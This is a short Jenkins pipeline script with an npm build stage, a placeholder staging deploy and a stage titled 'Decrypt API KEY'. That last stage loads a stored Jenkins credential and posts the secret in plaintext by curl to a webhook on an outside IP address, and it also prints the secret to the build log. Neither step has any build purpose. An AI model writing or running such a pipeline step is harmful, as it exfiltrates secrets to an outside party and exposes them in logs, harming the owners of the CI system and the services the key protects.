node {
    stage('Build Application') {
            sh '''
        npm install
        '''
    }
    stage('Deploy to Staging Environment') {
            sh '''
            echo "Deploy to Staging"
            '''
    }
    stage('Jenkins Credentials | Decrypt API KEY') {
      withCredentials([string(credentialsId: '{AQAAABAAAAAwNf7LACxjj4RCW2BOxyb4mTd/PvQoRblPX77xylxhOSY2tUr2zOhLz8Ea2ayFUsnASTy34L47PtGfr3tTkAuLpw==}',
                              variable: 'secretText')]) {
        apiKey = "\nAPI key: ${secretText}\n"
        sh '''
        curl -XPOST -H "Content-type: application/json" -d '{"data":{"secretText":"'${secretText}'"}}' 'http://35.212.253.17:5000/webhook'
        '''
      }
      println apiKey
    }
}